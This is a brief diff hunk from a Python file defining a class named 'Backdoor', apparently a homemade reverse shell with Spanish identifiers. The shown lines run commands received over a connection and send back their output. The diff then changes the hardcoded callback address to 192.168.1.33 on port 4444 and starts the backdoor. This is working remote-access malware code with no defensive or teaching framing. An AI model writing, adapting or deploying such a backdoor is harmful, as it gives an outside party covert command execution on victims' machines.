@@ -123,5 +123,5 @@ class Backdoor:
             resultadosComando = self.ejecutarComando(command)
             self.connection.send(resultadosComando)
 
-puerta = Backdoor("10.51.42.221", 4444)
+puerta = Backdoor("192.168.1.33", 4444)
 puerta.run()
